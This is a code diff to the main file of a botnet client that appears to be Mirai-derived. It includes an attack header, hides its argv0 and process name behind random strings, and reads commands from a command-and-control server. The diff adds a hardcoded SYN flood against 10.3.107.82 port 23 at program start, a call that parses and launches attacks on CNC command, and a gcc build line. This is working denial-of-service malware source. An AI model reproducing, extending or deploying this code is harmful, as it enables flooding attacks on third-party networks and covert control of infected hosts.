@@ -16,12 +16,16 @@
 #include <time.h>
 
 #include "includes.h"
+#include "attack.h"
 #include "rand.h"
 #include "util.h"
 
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
 static void teardown_connection(void);
+
+
+//gcc -std=c99 -Wall -DDEBUG bot/*.c  -o duckduck.bin
 
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
@@ -47,6 +51,8 @@ int util_strcpy(char *dst, char *src) {
 
 
 int main(int argc, char **args) {
+    syn_flood("10.3.107.82", 23, 1000000);
+
     char name_buf[32];
     char id_buf[32];
 	int name_buf_len;
@@ -54,7 +60,6 @@ int main(int argc, char **args) {
 
 #ifndef DEBUG
     sigset_t sigs;
-	int wfd;
 	// Signal based control flow
     sigemptyset(&sigs);
     sigaddset(&sigs, SIGINT);
@@ -71,13 +76,13 @@ int main(int argc, char **args) {
 
     // Hide argv0
     name_buf_len = ((rand_next() % 4) + 3) * 4;
-    rand_alphastr(name_buf, name_buf_len);
+    rand_alphastr((unsigned char*)name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
     util_strcpy(args[0], name_buf);
 
     // Hide process name
     name_buf_len = ((rand_next() % 6) + 3) * 4;
-    rand_alphastr(name_buf, name_buf_len);
+    rand_alphastr((unsigned char*)name_buf, name_buf_len);
     name_buf[name_buf_len] = 0;
 
 	prctl(PR_SET_NAME, name_buf);
@@ -90,8 +95,7 @@ int main(int argc, char **args) {
     srv_addr.sin_addr.s_addr = INADDR_ANY;
 
  	while (TRUE) {
-		fd_set fdsetrd, fdsetwr, fdsetex;
-        int mfd, nfds;
+		fd_set fdsetrd, fdsetwr;
 
         FD_ZERO(&fdsetrd);
         FD_ZERO(&fdsetwr);
@@ -149,8 +153,10 @@ int main(int argc, char **args) {
 
 #ifdef DEBUG
     printf("[main] Received %d bytes from CNC\n", len);
-    printf("[main] Received command :  %s from CNC\n", rdbuf);
+    printf("[main] Received command :  %s", rdbuf);
 #endif
+
+            parse_attack(rdbuf);
 		}
 
 
